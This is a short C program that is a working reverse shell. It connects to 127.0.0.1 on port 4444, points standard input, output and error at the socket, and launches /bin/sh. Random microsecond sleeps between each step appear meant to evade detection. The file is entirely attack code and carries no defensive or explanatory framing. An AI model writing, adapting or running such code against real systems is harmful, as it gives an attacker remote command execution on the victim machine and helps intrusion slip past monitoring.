#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand(time(NULL));
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

    usleep(rand() % 1000000); // random microsecond delay
    connect(sock, (struct sockaddr*)&server, sizeof(server));
    usleep(rand() % 1000000);
    dup2(sock, 0);
    usleep(rand() % 1000000);
    dup2(sock, 1);
    usleep(rand() % 1000000);
    dup2(sock, 2);
    usleep(rand() % 1000000);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    return 0;
}